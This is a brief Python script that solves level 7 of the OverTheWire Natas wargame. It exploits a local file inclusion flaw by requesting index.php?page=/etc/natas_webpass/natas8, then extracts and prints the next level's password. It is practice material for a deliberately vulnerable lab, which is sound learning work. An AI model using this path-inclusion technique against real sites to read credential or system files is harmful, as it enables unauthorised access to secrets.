
#!/usr/bin/python
# coding: utf-8
from requests.auth import HTTPBasicAuth
import requests
import sys
import re

def exploit(level7pass):
    print "{+} Natas Level 7. Doing magic..."
    try:
        r = requests.get(url="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8", auth=HTTPBasicAuth('natas7', level7pass))
    except Exception:
        print "{-} Something fucked up, request failed. Bailing. Maybe your password was wrong?"
        return None
    password = re.findall("(.*?)\n\n<!-- hint", r.text)
    if len(password):
        return password[0]
    return None

def main(args):
    if len(args) != 2:
        sys.exit("use: %s level7password" %(args[0]))
    level8pass = exploit(args[1])
    if level8pass != None:
        print "{$$} Level 8 Password is: %s" %(level8pass)

if __name__ == "__main__":
    main(args=sys.argv)
